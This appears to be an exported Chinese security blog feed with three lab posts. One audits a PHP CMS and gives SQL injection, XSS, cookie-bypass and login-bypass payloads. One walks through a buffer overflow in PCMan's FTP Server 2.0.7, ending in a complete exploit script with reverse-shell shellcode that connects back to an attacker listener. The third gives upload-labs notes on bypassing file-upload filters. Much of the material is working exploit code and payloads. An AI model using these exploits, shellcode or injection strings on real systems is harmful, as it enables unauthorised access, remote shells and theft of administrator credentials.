&#x27;$mail&#x27;)&quot;; $mail 未作任何过滤，闭合括号，使用报错注入 INSERT型SQL注入漏洞发生在files/submit.php文件中 1234567891011121314151617181920212223242526272829$tz=$_POST[&#x27;tz&#x27;]; // 第11行....$query = &quot;INSERT INTO interaction ( // 121行type,xs,cid,name,mail,url,touxiang,shebei,ip,content,tz,date) VALUES (&#x27;$type&#x27;,&#x27;$xs&#x27;,&#x27;$cid&#x27;,&#x27;$name&#x27;,&#x27;$mail&#x27;,&#x27;$url&#x27;,&#x27;$touxiang&#x27;,&#x27;$shebei&#x27;,&#x27;$ip&#x27;,&#x27;$content&#x27;,&#x27;$tz&#x27;,now())&quot;; 由于11行$tzPOST请求传过来，未作任何处理。 漏洞利用：利用思路跟BlueCMS分析里面一样，插入两条数据(内容处显示回显结果) 123name=Tao&amp;mail=Tao@qq.com&amp;url=http://www.baidu.com&amp;content=aaaaa测试&amp;cid=1&amp;tz=888&#x27;,now()),(&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;Tao&#x27;,&#x27;Tao@qq.com&#x27;,&#x27;http://www.baidu.com&#x27;,&#x27;5&#x27;,&#x27;PC&#x27;,&#x27;127.0.0.1&#x27;,(select/*Tao*/user()),&#x27;Tao 两个SQL注入123456789101112131415$type=addslashes($_GET[&#x27;type&#x27;]);$cid=$_POST[&#x27;cid&#x27;]; if ($type==&#x27;comment&#x27;)&#123; //75行$fhlink=&quot;/?r=content&amp;cid=&quot;.$cid;$fhname=&quot;评论&quot;;$type=1;&#125;if ($pltz==1)&#123;.... if ($type==1)&#123; $query = &quot;SELECT * FROM content WHERE( id= $cid)&quot;; // SQL注入 $result = mysql_query($query) or die(&#x27;SQL语句有误：&#x27;.mysql_error()); $wz = mysql_fetch_array($result); $title=$wz[&#x27;title&#x27;];&#125; 这里想要利用SQL注入，首先需要使得$pltz==1, 然后使$type==1, 而需要使$type=1的条件就是$type==&#39;comment&#39;。而这个我们是可以控制的，所以产生了此漏洞 123456789101112if ($type==&#x27;download&#x27;)&#123; // 86行 $fhlink=&quot;/?r=software&amp;cid=&quot;.$cid; $fhname=&quot;软件评论&quot;; $type=3;&#125;........if ($type==3)&#123;$query = &quot;SELECT * FROM download WHERE( id= $cid)&quot;; // SQL注入$result = mysql_query($query) or die(&#x27;SQL语句有误：&#x27;.mysql_error());$wz = mysql_fetch_array($result);$title=$wz[&#x27;title&#x27;]; 以上两个SQL注入漏洞点，产生原因一样。但是有点鸡助，因为使$pltz ==1需要开启新评论/留言通知站长功能。 1234567891011121314//查询系统高级设置$query = &quot;SELECT * FROM seniorset&quot;;$result = mysql_query($query) or die(&#x27;SQL语句有误：&#x27;.mysql_error());$advanced = mysql_fetch_array($result);$lysh=$advanced [&#x27;lysh&#x27;];//留言审核$plsh=$advanced [&#x27;plsh&#x27;];//评论审核$pltz=$advanced [&#x27;pltz&#x27;];//新留言评论通知if ($pltz==1)&#123;...... if ($type==1)&#123; $query = &quot;SELECT * FROM content WHERE( id= $cid)&quot;; // SQL注入 .... if ($type==3)&#123; $query = &quot;SELECT * FROM download WHERE( id= $cid)&quot;; // SQL注入 需要使$pltz ==1，才会进入if ($type==1)。然后执行sql语句，而$pltz是从seniorset表中来的（开启新评论/留言通知站长功能）。 为了方便理解，简洁的整理了一下执行的流程： 12345678910111213141516171819202122$cid=$_POST[&#x27;cid&#x27;];//查询系统高级设置$query = &quot;SELECT * FROM seniorset&quot;;$result = mysql_query($query) or die(&#x27;SQL语句有误：&#x27;.mysql_error());$advanced = mysql_fetch_array($result);$lysh=$advanced [&#x27;lysh&#x27;];//留言审核$plsh=$advanced [&#x27;plsh&#x27;];//评论审核$pltz=$advanced [&#x27;pltz&#x27;];//新留言评论通知if ($pltz==1)&#123; .... if ($type==1)&#123; $query = &quot;SELECT * FROM content WHERE( id= $cid)&quot;; $result = mysql_query($query) or die(&#x27;SQL语句有误：&#x27;.mysql_error()); $wz = mysql_fetch_array($result); ..... if ($type==3)&#123; $query = &quot;SELECT * FROM download WHERE( id= $cid)&quot;; $result = mysql_query($query) or die(&#x27;SQL语句有误：&#x27;.mysql_error()); $wz = mysql_fetch_array($result); $title=$wz[&#x27;title&#x27;]; .....&#125; 这个漏洞利用的前提$pltz==1,也就是后台高级设置开启新评论/留言通知站长功能是打开的。 漏洞利用： 1name=Tao&amp;mail=Tao1@qq.com&amp;url=http://www.baidu.com&amp;content=Tao测试测试哈哈哈哈&amp;cid=1)+or+updatexml(1,concat(0x7e,(select+concat(user,0x3a,password)+from+manage)),1)# $type=&#39;comment&#39;=1触发 $type=&#39;download&#39;=3触发 反射型xss漏洞触发在files/contact.php文件 1234567$page=addslashes($_GET[&#x27;page&#x27;]);if ($page&lt;&gt;&quot;&quot;)&#123;if ($page&lt;&gt;1)&#123;$pages=&quot;第&quot;.$page.&quot;页 - &quot;;&#125;&#125;// 12~15行 $_GET[&#39;page&#39;]未进行只进行了部分字符转义，其他未作处理就直接输出了。 漏洞触发在files/list.php文件 1234567$yemas=$_GET[&#x27;page&#x27;];if ($yemas&lt;&gt;&quot;&quot;)&#123;$yema=&quot; - 第 $yemas 页&quot;;&#125;else&#123;$yema=&quot;&quot;; &#125;// 23~28行 跟上面同理 漏洞触发在files/download.php文件 存储型xss漏洞产生在files/submit.php文件中，昵称未进行处理，便存储到数据库中 12345678910111213$name=$_POST[&#x27;name&#x27;];$mail=$_POST[&#x27;mail&#x27;];$url=$_POST[&#x27;url&#x27;];$content=$_POST[&#x27;content&#x27;];$cid=$_POST[&#x27;cid&#x27;];$ip=$_SERVER[&quot;REMOTE_ADDR&quot;];$tz=$_POST[&#x27;tz&#x27;];.....$content= addslashes(strip_tags($content));//过滤HTML....$query = &quot;INSERT INTO interaction (type,xs,cid,name,mail,url,touxiang,shebei,ip,content,tz,date) VALUES (&#x27;$type&#x27;,&#x27;$xs&#x27;,&#x27;$cid&#x27;,&#x27;$name&#x27;,&#x27;$mail&#x27;,&#x27;$url&#x27;,&#x27;$touxiang&#x27;,&#x27;$shebei&#x27;,&#x27;$ip&#x27;,&#x27;$content&#x27;,&#x27;$tz&#x27;,now())&quot;; 在评论区可以提交昵称、邮箱、网址、内容。但是显示评论和留言的地方只显示昵称。所以只有昵称处才存在存储型XSS payload: Taoo&lt;img src=1 onerror=alert(/Tao/);&gt; 前台文章处 查看后台 垂直越权（逻辑漏洞）漏洞发现在inc/checklogin.php 1234567&lt;?php$user=$_COOKIE[&#x27;user&#x27;];if ($user==&quot;&quot;)&#123;header(&quot;Location: ?r=login&quot;);exit; &#125;?&gt; 该代码存在越权访问，这里直接从COOKIE处赋值给$user。如果$user不为空就可以直接访问 我们通过调试来分析一下后台登陆的执行流程。 首先访问admin目录，默认跳转传参?r=login,也就是下面的执行过程，文件包含admin/files/login.php文件 然后包含数据库连接文件 这后面没有什么（这是正常访问，输入账号密码的流程）。 但是注意我们要利用此漏洞的话，需要修改完cookie后访问admin/?r=index,admin/index.php会包含files文件夹下index.php文件，所以这里实际访问的文件就是admin/files/index.php,文件内容如下 直接就包含inc/checklogin.php 1234567&lt;?php$user=$_COOKIE[&#x27;user&#x27;];if ($user==&quot;&quot;)&#123;header(&quot;Location: ?r=login&quot;);exit; &#125;?&gt; $_COOKIE[&#39;user&#39;]不为空就不跳转到?r=login,直接进入后台 还有一点就是，我们修改完cookie,使得$_COOKIE[&#39;user&#39;]不为空。不一定非要访问admin/?r=index,访问有载入inc/checklogin.php文件都可以 漏洞利用： 记住管理处路劲：http://www.bearsea.com/admin/?r=index 退出管理员，来到登录处。添加cookie值 再次访问后台。没登录也直接进入了后台页面😂 后台SQL注入漏洞产生文件admin/files/login.php 1234567$login=$_POST[&#x27;login&#x27;];$user=$_POST[&#x27;user&#x27;];$password=$_POST[&#x27;password&#x27;];$checkbox=$_POST[&#x27;checkbox&#x27;];if ($login&lt;&gt;&quot;&quot;)&#123;$query = &quot;SELECT * FROM manage WHERE user=&#x27;$user&#x27;&quot;; $query存在SQL注入，这是$user未经过任何处理，直接代入语句中执行导致的 利用方式： user: 1&#39; or updatexml(1,concat(0x7e,(select concat(user,0x3a,password) from manage)),1)# 登录，返回管理员账号和加密的密码 后台万能密码登录漏洞产生文件admin/files/login.php 123456789101112131415161718$login=$_POST[&#x27;login&#x27;];$user=$_POST[&#x27;user&#x27;];$password=$_POST[&#x27;password&#x27;];$checkbox=$_POST[&#x27;checkbox&#x27;];if ($login&lt;&gt;&quot;&quot;)&#123;$query = &quot;SELECT * FROM manage WHERE user=&#x27;$user&#x27;&quot;;$result = mysql_query($query) or die(&#x27;SQL语句有误：&#x27;.mysql_error());$users = mysql_fetch_array($result);if (!mysql_num_rows($result)) &#123; echo &quot;&lt;Script language=JavaScript&gt;alert(&#x27;抱歉，用户名或者密码错误。&#x27;);history.back();&lt;/Script&gt;&quot;;exit;&#125;else&#123;$passwords=$users[&#x27;password&#x27;];if(md5($password)&lt;&gt;$passwords)&#123;echo &quot;&lt;Script language=JavaScript&gt;alert(&#x27;抱歉，用户名或者密码错误。&#x27;);history.back();&lt;/Script&gt;&quot;;exit; &#125; $login 未经过任何处理拼接sql语句，且只进行了密码md5对比。可绕过 payload: user：-1&#39; union select 1,2,3,&#39;ace1785ac351e22a3d18e594d77a67dd&#39;,5,6,7,8 # password: Tao 后台多处漏洞后台暂时不审了，下次一定👌","categories":[{"name":"web安全","slug":"web安全","permalink":"https://taonn.github.io/categories/web%E5%AE%89%E5%85%A8/"},{"name":"代码审计","slug":"web安全/代码审计","permalink":"https://taonn.github.io/categories/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"PHP代码审计","slug":"PHP代码审计","permalink":"https://taonn.github.io/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"PCMan's FTP Server缓冲区溢出分析与利用","slug":"PCMan-s-FTP-Server缓冲区溢出分析与利用","date":"2020-11-16T06:43:43.000Z","updated":"2021-03-16T05:31:50.528Z","comments":true,"path":"2020/11/16/PCMan-s-FTP-Server缓冲区溢出分析与利用/","link":"","permalink":"https://taonn.github.io/2020/11/16/PCMan-s-FTP-Server%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/","excerpt":"","text":"实验环境 WindowsXP-SP3（PCMan’s FTP Server 2.0.7， Immunityinc debugger, ） 攻击机：kali 2.0 需要的基础：对x86汇编语言有一定的了解，python基础，常用调试工具的使用 缓冲区溢出基础详情参考：缓冲区溢出原理分析(一) ​ 简单的来说，如果我们输入的数据长度超过了开发人员定义的缓冲区，那么这个数据就可以覆盖掉关键的寄存器，如EIP，EIP是指令寄存器，它存放当前指令的下一条指令的地址。如果它被来自用户输入的垃圾数据覆盖了，程序通常会崩溃，因为它跳转到的地址并尝试指向，但执行的并不是有效的指令。我们的目的就是要定制一个数据发送到程序覆盖EIP，使程序跳转到我们控制的位置，这样我们就可以执行shellcode了 图片来源：http://www.legendsec.org/2020.html 查找缓冲区溢出模糊测试(Fuzzing)要完成一次缓冲区溢出测试，我们就需要知道哪里会发生缓冲区溢出，此时我们就需要进行模糊测试(fuzzing),现在我们需要发送不同长度和内容的自定义字符串找到我们要测试的输入点，如果程序崩溃,那么我们就使用调试工具调查一下为什么会崩溃，可不可以利用,这里我们以PCMan’s FTP Server 2.0.7为例子 首先我们来测试一下用户名这个输入点有没有存在问题。这里我们用Python编写了一个Fuzzer程序 123456789101112131415161718192021222324#!/usr/bin/env pythonimport sysimport sockethost = sys.argv[1] # receive IPport = int(sys.argv[2]) # receive portfuzz = 100while True: try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.settimeout(2) s.send(&quot;USER &quot; + &quot;A&quot; * fuzz) s.recv(1024) s.send(&quot;PASS Tao&quot;) s.recv(1024) print &quot;Send str length: &quot; + str(fuzz) fuzz += 100 except Exception,err: print&quot;End..., Send str length: &quot; + str(fuzz) sys.exit() finally: s.close() 首先我们打开PCmanFTP运行程序： 使用./fuzzing.py 172.16.10.156 21, 运行脚本，发现发送到大约2000的时候挂起了，检查我们的FTP服务器，可以发现已经崩溃。 接下来我们就要来进一步研究一下，确认这错误是否可以利用，我们重新启动PCmanFTP程序 崩溃调查打开Immunityinc debugger，然后File-&gt;Attach (首先要确保FTP程序已经在运行) 如上图所示，此时程序已经加载进来，是暂停状态， 我们使用快捷键F9让程序跑起来，也可以使用菜单栏的运行按钮 当程序处于Running状态的时候，我们再一次运行fuzzing.py脚本。 此时我们程序崩溃，但是这里的EIP值并没有覆盖成我们想要41414141, 但是根据程序输出我们可知，发送字符达到2000时使得程序崩溃，此时我们猜测2000是大概的溢出位置（因为这里刚好导致了程序溢出，但并没有覆盖返回地址）我们再一次测试，这次测试将步长修改为150, 代码如下： 123456789101112131415161718192021222324#!/usr/bin/env pythonimport sysimport sockethost = sys.argv[1] # receive IPport = int(sys.argv[2]) # receive portfuzz = 100while True: try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.settimeout(2) s.send(&quot;USER &quot; + &quot;A&quot; * fuzz) s.recv(1024) s.send(&quot;PASS Tao&quot;) s.recv(1024) print &quot;Send str length: &quot; + str(fuzz) fuzz += 150 # modify this except Exception,err: print&quot;End..., Send str length: &quot; + str(fuzz) sys.exit() finally: s.close() 程序输出： 上图我们可以发现EIP寄存器的值是41414141，这意味着我们可以控制EIP（这也意味着我们上面的猜想是正确的），那么接下来我们要解决的问题就是哪里的A将EIP覆盖了呢？ 查找偏移数（Finding the offset）使用Metasploit的pattern_create工具创建一个500大小的字符串， 因为我们通过上面的测试，大概判断溢出字符在1900~2050, 那么我们填写&#39;A&#39; * 1900 + &quot;工具生成字符&quot; 构成payload发送至FTP服务端，如上操作，我们让程序在Immunityinc debugger中运行起来,然后执行如下程序： 12345678910111213141516#!/usr/bin/env python# filename: findoffset.pyimport sysimport socketpayload = &quot;A&quot; * 1900 + &quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq&quot;host = sys.argv[1] # receive IPport = int(sys.argv[2]) # receive ports = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((host, port))s.send(&quot;USER &quot; + payload)s.recv(1024)s.send(&quot;PASS Tao&quot;)s.recv(1024) 可以发现，这一次EIP寄存器的值是0x34644133, 为了计算这个值偏移量，我们使用Metasploit中的另一个工具pattern_offset来确定字节数 123./pattern_offset.rb -l 500 -q 34644133# -q参数为要查询的地址，-l参数为要查询的字符序列的长度# 上图中我们得出的地址是 0x34644133, 而生成的字符串长度为500， 因此这里使用 -l 500 -q 34644133 计算结果为101, 也就是说覆盖返回地址是在[2002-2005] 这四个字节，我们来验证一下： 注意，下图的1900 是我们上面findoffset.py这个程序pyload中的A字符数，而偏移量为101，那么最终覆盖EIP前的字符数就是1900+101=2001个字符 123456789101112131415#!/usr/bin/env python# filename: overeip.pyimport sysimport socketpayload = &quot;A&quot; * 2001 + &quot;B&quot; * 4host = sys.argv[1] # receive IPport = int(sys.argv[2]) # receive ports = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((host, port))s.send(&quot;USER &quot; + payload)s.recv(1024)s.send(&quot;PASS Tao&quot;)s.recv(1024) 执行程序： 查看windows xp，发现EIP（程序返回地址）被我们上面的4个B给覆盖了，到这一步，我们已经可以精确的覆盖EIP了 寻找shellcode位置我们在上面程序pyload后面加100个C，然后执行 可以看到，这里ESP指向的是我们在EIP后面给的100个C, 现在我们是要将C替换成我们希望运行的Shellcode。然后让EIP跳转到ESP寄存器的位置 获得 EIP to jump为什么我们不能告诉EIP去内存地址0x0012EDB8呢？因为这个地址在各个计算机上都不一样得，你不可能只想这个攻击只能攻击自己计算机吧。所以这里我们就要在程序的dll中找到具有JMP ESP命令的内存地址。这样我们就可以将EIP指向该位置，使其跳转到我们的缓冲区中。 我们这里使用Immunityinc debugger 在程序的dll中找到具有JMP ESP命令的内存地址 看看有哪些dll加载到了这个程序 这里我们选择kernel32.dll 进行搜索， 搜索JMP ESP命令 右键-&gt; Search for -&gt; Command -&gt; 输出jmp esp 搜索 这里返回的内存地址为0x7C86467B, 这个地址没有坏字符（坏字符是会破坏我们漏洞的字符，如0x00），我们可以来利用,因为这里我们是小端显示，所以构造shellcode的时候需要倒过来写！ 生成shellcode12msfvenom -p windows/shell_reverse_tcp LHOST=172.16.10.143 LPORT=1234 EXITFUNC=thread -f python -b &quot;\\x00\\x0a\\x0d&quot; -a x86# 0x0A表示回车，0x0D表示换行，0x00表示字符串的结束， 这些都是坏字符，会破环我们的payload 我们在最后跳转地址加入若干NOP字符，NOP代表跳过，意味着什么都不需要操作，并且指示CPU跳过此指令。有时候可以通过在shellcode前填充NOP增加漏洞利用程序和shellcode可靠性。这里我添加30个NOP，以提高可靠性。最终exp程序为： 1234567891011121314151617181920212223242526272829303132333435363738394041424344#!/usr/bin/env python# filename: exp.pyimport sysimport socketbuf = &quot;&quot;buf += &quot;\\xdb\\xd5\\xbd\\x8c\\x36\\xb0\\x37\\xd9\\x74\\x24\\xf4\\x58\\x2b&quot;buf += &quot;\\xc9\\xb1\\x52\\x31\\x68\\x17\\x83\\xe8\\xfc\\x03\\xe4\\x25\\x52&quot;buf += &quot;\\xc2\\x08\\xa1\\x10\\x2d\\xf0\\x32\\x75\\xa7\\x15\\x03\\xb5\\xd3&quot;buf += &quot;\\x5e\\x34\\x05\\x97\\x32\\xb9\\xee\\xf5\\xa6\\x4a\\x82\\xd1\\xc9&quot;buf += &quot;\\xfb\\x29\\x04\\xe4\\xfc\\x02\\x74\\x67\\x7f\\x59\\xa9\\x47\\xbe&quot;buf += &quot;\\x92\\xbc\\x86\\x87\\xcf\\x4d\\xda\\x50\\x9b\\xe0\\xca\\xd5\\xd1&quot;buf += &quot;\\x38\\x61\\xa5\\xf4\\x38\\x96\\x7e\\xf6\\x69\\x09\\xf4\\xa1\\xa9&quot;buf += &quot;\\xa8\\xd9\\xd9\\xe3\\xb2\\x3e\\xe7\\xba\\x49\\xf4\\x93\\x3c\\x9b&quot;buf += &quot;\\xc4\\x5c\\x92\\xe2\\xe8\\xae\\xea\\x23\\xce\\x50\\x99\\x5d\\x2c&quot;buf += &quot;\\xec\\x9a\\x9a\\x4e\\x2a\\x2e\\x38\\xe8\\xb9\\x88\\xe4\\x08\\x6d&quot;buf += &quot;\\x4e\\x6f\\x06\\xda\\x04\\x37\\x0b\\xdd\\xc9\\x4c\\x37\\x56\\xec&quot;buf += &quot;\\x82\\xb1\\x2c\\xcb\\x06\\x99\\xf7\\x72\\x1f\\x47\\x59\\x8a\\x7f&quot;buf += &quot;\\x28\\x06\\x2e\\xf4\\xc5\\x53\\x43\\x57\\x82\\x90\\x6e\\x67\\x52&quot;buf += &quot;\\xbf\\xf9\\x14\\x60\\x60\\x52\\xb2\\xc8\\xe9\\x7c\\x45\\x2e\\xc0&quot;buf += &quot;\\x39\\xd9\\xd1\\xeb\\x39\\xf0\\x15\\xbf\\x69\\x6a\\xbf\\xc0\\xe1&quot;buf += &quot;\\x6a\\x40\\x15\\xa5\\x3a\\xee\\xc6\\x06\\xea\\x4e\\xb7\\xee\\xe0&quot;buf += &quot;\\x40\\xe8\\x0f\\x0b\\x8b\\x81\\xba\\xf6\\x5c\\x02\\x2a\\xf2\\x13&quot;buf += &quot;\\x32\\x49\\x02\\x28\\x11\\xc4\\xe4\\x5a\\x85\\x81\\xbf\\xf2\\x3c&quot;buf += &quot;\\x88\\x4b\\x62\\xc0\\x06\\x36\\xa4\\x4a\\xa5\\xc7\\x6b\\xbb\\xc0&quot;buf += &quot;\\xdb\\x1c\\x4b\\x9f\\x81\\x8b\\x54\\x35\\xad\\x50\\xc6\\xd2\\x2d&quot;buf += &quot;\\x1e\\xfb\\x4c\\x7a\\x77\\xcd\\x84\\xee\\x65\\x74\\x3f\\x0c\\x74&quot;buf += &quot;\\xe0\\x78\\x94\\xa3\\xd1\\x87\\x15\\x21\\x6d\\xac\\x05\\xff\\x6e&quot;buf += &quot;\\xe8\\x71\\xaf\\x38\\xa6\\x2f\\x09\\x93\\x08\\x99\\xc3\\x48\\xc3&quot;buf += &quot;\\x4d\\x95\\xa2\\xd4\\x0b\\x9a\\xee\\xa2\\xf3\\x2b\\x47\\xf3\\x0c&quot;buf += &quot;\\x83\\x0f\\xf3\\x75\\xf9\\xaf\\xfc\\xac\\xb9\\xd0\\x1e\\x64\\xb4&quot;buf += &quot;\\x78\\x87\\xed\\x75\\xe5\\x38\\xd8\\xba\\x10\\xbb\\xe8\\x42\\xe7&quot;buf += &quot;\\xa3\\x99\\x47\\xa3\\x63\\x72\\x3a\\xbc\\x01\\x74\\xe9\\xbd\\x03&quot;payload = &quot;A&quot; * 2001 + &quot;\\x7b\\x46\\x86\\x7c&quot; + &quot;\\x90&quot; * 30 + bufhost = sys.argv[1] # receive IPport = int(sys.argv[2]) # receive ports = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((host, port))s.send(&quot;USER &quot; + payload)s.recv(1024)s.send(&quot;PASS Tao&quot;)s.recv(1024) kali2.0 使用nc -lp 1234 监听1234端口，然后执行./exp.py 172.16.10.156 21 成功！ 参考文章：http://www.legendsec.org/2020.html， https://www.anquanke.com/post/id/84893","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://taonn.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"溢出攻击","slug":"溢出攻击","permalink":"https://taonn.github.io/tags/%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/"}]},{"title":"upload-labs笔记","slug":"upload-labs笔记","date":"2020-11-03T14:54:50.000Z","updated":"2021-03-16T05:29:01.518Z","comments":true,"path":"2020/11/03/upload-labs笔记/","link":"","permalink":"https://taonn.github.io/2020/11/03/upload-labs%E7%AC%94%E8%AE%B0/","excerpt":"","text":"说明：做题前先清空之前关卡上传的文件 Pass-01 js检查1. 分析首先我们先上传一张正常的图片，确定上传后文件保存的路劲 上传路劲为../upload/, 也就是http://ip/upload/tao.jpg 查看源代码，发现基于前端js的检查，只检查了文件上传的后缀，那么我们基于前端控制台，就该即可绕过 123456789101112131415161718// Pass-01function checkFile() &#123; var file = document.getElementsByName(&#x27;upload_file&#x27;)[0].value; if (file == null || file == &quot;&quot;) &#123; alert(&quot;请选择要上传的文件!&quot;); return false; &#125; //定义允许上传的文件类型 var allow_ext = &quot;.jpg|.png|.gif&quot;; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;)); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name) == -1) &#123; var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name; alert(errMsg); return false; &#125; &#125; 2. 利用我们将上述代码允许修改成.php, 然后复制代码在concole执行， 执行如下图： 然后我们上传php文件 Pass-02 MIME类型检查1. 分析查看源代码： 1234567891011121314151617181920# Pass-02$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;文件类型不正确，请重新上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH.&#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 上面代码第5行只对文件的MIME类型进行了检查，及只对http包头Content-type字段进行了校验 常见MIME类型 类型 描述 典型示例 text 表明文件是普通文本，理论上是人类可读 text/plain, text/html, text/css, text/javascript image 表明是某种图像。不包括视频，但是动态图（比如动态gif）也使用image类型 image/gif, image/png, image/jpeg, image/bmp, image/webp, image/x-icon, image/vnd.microsoft.icon audio 表明是某种音频文件 audio/midi, audio/mpeg, audio/webm, audio/ogg, audio/wav video 表明是某种视频文件 video/webm, video/ogg application 表明是某种二进制数据 application/octet-stream, application/pkcs12, application/vnd.mspowerpoint, application/xhtml+xml, application/xml, application/pdf 2. 利用因为代码只对Content-type字段进行了校验， 我们使用burp修改符号的类型即可绕过 Pass-03 黑名单绕过1. 分析12345678910111213141516171819202122232425262728# Pass-03$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; trim() 函数移除字符串两侧的空白字符或其他预定义字符 语法：trim(string,charlist) 参数 描述 string 必需。规定要检查的字符串。 charlist 可选。规定从字符串中删除哪些字符。如果被省略，则移除以下所有字符：“\\0” - NULL”\\t” - 制表符”\\n” - 换行”\\x0B” - 垂直制表符”\\r” - 回车” “ - 空格 deldot(file_name); //删除文件名末尾的点 123456789101112function deldot($s)&#123; for($i = strlen($s)-1;$i&gt;0;$i--)&#123; $c = substr($s,$i,1); if($i == strlen($s)-1 and $c != &#x27;.&#x27;)&#123; return $s; &#125; if($c != &#x27;.&#x27;)&#123; return substr($s,0,$i+1); &#125; &#125;&#125; strrchr() 函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符 语法：strrchr(string,char) 参数 描述 string 必需。规定要搜索的字符串。 char 必需。规定要查找的字符。如果该参数是数字，则搜索匹配此数字的 ASCII 值的字符。 返回值 返回从某个字符串在另一个字符串中最后一次出现的位置到主字符串结尾的所有字符。 strtolower() 函数把字符串转换为小写 str_ireplace() 函数替换字符串中的一些字符（不区分大小写）。 该函数必须遵循下列规则： 如果搜索的字符串是一个数组，那么它将返回一个数组。 如果搜索的字符串是一个数组，那么它将对数组中的每个元素进行查找和替换。 如果同时需要对数组进行查找和替换，并且需要执行替换的元素少于查找到的元素的数量，那么多余元素将用空字符串进行替换 如果是对一个数组进行查找，但只对一个字符串进行替换，那么替代字符串将对所有查找到的值起作用 语法：str_ireplace(find,replace,string,count) 参数 描述 find 必需。规定要查找的值。 replace 必需。规定替换 find 中的值的值。 string 必需。规定被搜索的字符串。 count 可选。一个变量，对替换数进行计数。 不允许上传.asp,.aspx,.php,.jsp后缀文件，但是可以上传其他任意后缀 但是可以上传其他任意后缀 1.php .phtml .phps .php5 .pht 前提是apache的httpd.conf中有如下配置代码 1AddType application/x-httpd-php .php .phtml .phps .php5 .pht 或者上传.htaccess文件,需要： mod_rewrite模块开启 AllowOverride All 文件内容如下： &lt;FilesMatch &quot;shell.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; 1234567 - 此时上传&#96;shell.jpg&#96;文件即可被当作php来解析或者&#96;&#96;&#96;phpAddType application&#x2F;x-httpd-php .jpg 所有.jpg文件会被解析成php文件 这里第15行代码，会给文件进行重命名，导致上传的.htaccess会变成数字.htaccess 我们用第一种方法 2. 利用上传后缀为.php5 Pass-04 .htaccess绕过1. 分析12345678910111213141516171819202122232425262728# Pass-04$is_upload = 